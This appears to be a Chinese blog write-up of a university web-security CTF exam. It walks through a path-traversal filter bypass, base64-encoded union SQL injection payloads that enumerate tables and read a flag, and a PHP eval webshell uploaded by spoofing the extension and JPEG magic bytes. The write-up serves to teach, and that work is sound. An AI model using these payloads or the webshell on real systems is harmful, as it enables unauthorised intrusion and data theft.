---
declare: true
title: Web安全原理 CTF Writeup
categories: [CTF]
tags:
- CTF
- Web

---

> Web安全原理期末CTF

## What's your want?

查看题目源代码，没有发现提示。向输入框中输入flag，得到如下结果

![image-20221026083947762.png](https://s2.loli.net/2022/10/26/FMm5dVRODghxWGS.png)

猜测左上角字符串为base64编码，解码得到flag{WelC0me_to_ctf2}

## php is the best

查看index page源代码，得到提示：![image-20221026084137515.png](https://s2.loli.net/2022/10/26/95UKEmk6HbCtzNS.png)

查看another page源代码，得到提示：

![image-20221026084216965.png](https://s2.loli.net/2022/10/26/SK9HoqQT4n3w1Og.png)

可以看到flag在index和another的上级目录，并且后端对输入路径进行了过滤，不能以.开头，也不能出现两个以上的..，因此尝试使用环境变量来获取flag，构建get参数为?file=pwd/../../flag, 得到flag为flag{Bypass_File_Path_Check}

## ID System

URL中有id=MQo=，猜测是base64编码，解码后得到id=1。首先判断数据库中共有多少列，对1 order by 3编码，作为id，请求得到no result。对1 order by 2编码，作为id，得到两个字段，分别为S_ID和1-S_Name，说明flag应该不在这个表中。

尝试获取当前表所在的数据库，使用1 union select 1, database();来对数据库进行联合查询，编码为MSB1bmlvbiBzZWxlY3QgMSwgZGF0YWJhc2UoKTs=，得到![image-20221026085420067.png](https://s2.loli.net/2022/10/26/vCdkaLS1GjE6b3h.png)

说明当前数据库为websec。尝试获取数据库中存在的所有表，使用1 union select 1, group_concat(table_name) from information_schema.tables where table_schema='websec';编码得到MSB1bmlvbiBzZWxlY3QgMSwgZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9J3dlYnNlYyc7，作为id输入，得到![image-20221026090019609.png](https://s2.loli.net/2022/10/26/vaOiR358ngmVb9K.png)

可以看到其中存在名为flag的表，使用同样方式获取flag中有哪些字段，使用1 union select 1, group_concat(column_name) from information_schema.columns where table_name='flag';，编码后作为id，得到![image-20221026090446857.png](https://s2.loli.net/2022/10/26/c5nqwFXr4jNP93E.png)

看到flag中只有一个value字段，使用1 union select 1, value from flag;编码输入得到![image-20221026090902879.png](https://s2.loli.net/2022/10/26/POrjMTYeNuVySi3.png)

*为什么联合查询需要select 1, group_concat()？因为联合查询要求两部分查找产生的表列数相同，而前面根据order by推断出web_security这个表的有两列，而group_concat和flag都只有一列，因此需要通过select 1, value/group_concat再添加一列。*

## Upload

首先创建webshell文件，写入\<?php @evalOST['pass']);?>，命名为shell.php.查看页面源代码，发现只允许上传jpg和png类型的文件，因此将文件重命名为shell.jpg以绕过前端检查，并使用burpsuite来拦截请求，将文件名重新改为php。

![image-20221026092519517.png](https://s2.loli.net/2022/10/26/2bNeKOwButhQiCG.png)

![image-20221026092851387.png](https://s2.loli.net/2022/10/26/cejm3KwLJuG5fyb.png)

页面报错error file head，说明后端对文件头做了校验，在文件头部添加FFD8FFE0，上传成功。

访问shell.php文件，发现File not found。尝试获取swp文件，在url中输入.index .php.swp，可以获取，通过vi -r打开，可以看到其中有如下几行代码：

![image-20221026094121034.png](https://s2.loli.net/2022/10/26/ok8JWPxtn3C9rZ6.png)

用户上传文件的文件名被重命名为md5加密后的密码.php。对shell.php计算md5，得到25a452927110e39a345a2511c57647f2，访问25a452927110e39a345a2511c57647f2.php文件，得到flag:

![image-20221026094549832.png](https://s2.loli.net/2022/10/26/HDFAbsn35jgNZQq.png)

## REFERENCE

https://blog.csdn.net/qq_35056292/article/details/102896557